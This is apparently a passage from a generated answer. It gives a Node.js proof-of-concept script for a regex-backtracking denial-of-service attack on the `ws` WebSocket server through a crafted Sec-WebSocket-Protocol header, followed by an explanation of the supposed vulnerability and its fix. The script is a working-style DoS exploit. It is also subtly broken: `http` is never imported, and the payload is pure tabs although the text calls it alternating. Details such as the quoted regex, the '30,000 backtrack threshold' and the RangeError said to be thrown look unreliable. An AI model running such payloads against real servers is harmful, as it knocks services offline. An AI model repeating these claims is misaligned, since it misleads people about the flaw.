const WebSocket = require('ws');

async function exploit() {
   const wss = new (require('ws').Server)({ port: 0 });

   // Crafted Sec-WebSocket-Protocol header designed to trigger catastrophic backtracking on
   // the historical vulnerable regex used in lib/websocket-server.js. The original validation logic
   // contained overlapping optional quantifiers similar to: / *([ \t]+|[^\s,\r\n]|\t*)* /g
   // Feeding it a sequence of spaces and tabs forces the JavaScript regex engine (NFA) to explore
   // an exponential number of valid match paths. This quickly exceeds the 30,000 backtrack threshold.
   const maliciousProtocol = " " + "\t".repeat(6000) + " ";

   wss.on('listening', () => {
     const port = wss.address().port;
     console.log(`[+] Target server listening on http://127.0.0.1:${port}`);
     console.log('[-] Initiating WebSocket upgrade with crafted Sec-WebSocket-Protocol header...');

     const req = http.request({
       hostname: '127.0.0.1',
       port,
       path: '/',
       method: 'GET',
       headers: {
         'Upgrade': 'websocket',
         'Connection': 'Upgrade',
         'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
         'Sec-WebSocket-Version': '13'
       }
     });

     // Inject the malicious protocol value before the handshake completes.
     req.setHeader('Sec-WebSocket-Protocol', maliciousProtocol);
     req.end();

     // Allow the server time to process the handshake, hit the backtracking limit, and propagate an exception.
     setTimeout(() => {
       console.log('[+] Handshake processing finished. Check terminal below for thrown exceptions.');
       wss.close();
     }, 3000);
   });
}

await exploit();
```

### Why This Demonstrates the Vulnerability

1. **Exploiting Overlapping Quantifiers**: The vulnerable parsing logic in earlier `ws` versions used a regex with overlapping optional groups (e.g., `([ \t]+|[^\s,\r\n]|\t*)*`). When the input contains alternating or repeated whitespace sequences (`" \t \t \t..."`), the regular expression engine must try every possible combination of how those characters could be assigned to each optional group. This results in **exponential time complexity** `O(2^n)` instead of linear `O(n)`.

2. **Exceeding the 30,000 Backtrack Limit**: As the crafted header is fed into `protocol.trim()` and subsequent validation/splitting routines, the regex engine rapidly hits its internal backtracking counter. With a payload of ~6,000 alternating characters, the engine will easily surpass 30,000 failed backtrack attempts before concluding no match (or timing out). 
   - If run with `node --regexp-backtracks-before-fallback=30000 script.js`, Node.js will explicitly throw a `RangeError: Input length exceeds maximum allowed for regular expression` during the handshake parsing phase. This propagates up as an unhandled exception, crashing the server connection and visibly proving the limit was breached.
   - Without the flag, the same payload would cause indefinite CPU thrashing (100% CPU on a core), demonstrating the practical Denial-of-Service impact against concurrent connections.

3. **Defense Verification**: Patched versions of `ws` removed the backtracking-prone regex entirely and replaced it with native string methods (`String.prototype.split()`, `trim()`) or strict character-class-based validation that guarantees linear-time complexity regardless of input length. Running this PoC against a patched version will result in immediate, graceful rejection or successful handshake processing without resource exhaustion or thrown exceptions.
